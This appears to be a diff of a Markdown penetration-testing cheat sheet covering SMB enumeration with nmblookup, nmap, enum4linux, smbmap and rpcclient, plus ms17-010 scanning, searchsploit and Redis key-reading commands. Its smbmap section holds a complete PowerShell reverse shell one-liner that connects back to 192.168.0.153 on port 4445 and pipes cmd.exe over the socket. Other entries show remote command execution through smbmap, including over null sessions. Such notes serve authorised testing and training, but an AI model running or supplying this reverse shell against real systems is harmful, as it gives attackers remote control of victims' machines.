@@ -228,6 +228,13 @@ Netbios-ssn 139/udp
 Microsoft-ds 445/tcp #if you are using active directory
 ````
 ### SMB Checklist
+- Basic Commands
+- From SMB command line
+- View/Get Files
+````
+get services.txt
+more services.txt
+````
 - Enumerate Hostname 
 ````
 nmblookup -A $ip
@@ -252,11 +259,7 @@ nmap --script smb-vuln* -p 139,445 $ip
 ````
 enum4linux -a $ip
 ````
-- Manual Inspection
-````
-smbver.sh $ip (port)
-````
-- Get a shell with smbmap
+- Get a shell with smbmap (windows)
 ````
 smbmap -u jsmith -p 'R33nisP!nckle' -d ABC -h 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' 
 ````
@@ -293,6 +296,10 @@ smbmap -u "admin" -p "password" -H 10.10.10.10 -x "ipconfig"
 - However, due to shell restrictions, you will need to escape the backslashes, so you end up with something like this:
 ````
 /usr/bin/smbclient \\\\10.10.10.10\\public mypasswd
+````
+- To authenticate with a null sessions
+````
+smbmap -u 'root' -p '' -H 10.10.232.5 -x 'ip addr'
 ````
 ### rpcclient
 - A tool used for executing client-side MS-RPC functions. A null session in a connection with a samba or SMB server that does not require authentication with a password.
@@ -386,6 +393,35 @@ nmap -p 445 [target] --script=smb-vuln-ms17-010
 searchsploit --exclude=dos -t apache 2.2.3
 msfconsole; > search apache 2.2.3
 ````
+## redis port 6379
+````
+if value is of type string -> GET <key>
+if value is of type hash -> HGETALL <key>
+if value is of type lists -> lrange <key> <start> <end>
+if value is of type sets -> smembers <key>
+if value is of type sorted sets -> ZRANGEBYSCORE <key> <min> <max>
+````
+- Use the TYPE command to check the type of value a key is mapping to:
+````
+type <key>
+````
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ## Stuck
 - https://book.hacktricks.xyz/
 - https://guide.offsecnewbie.com/
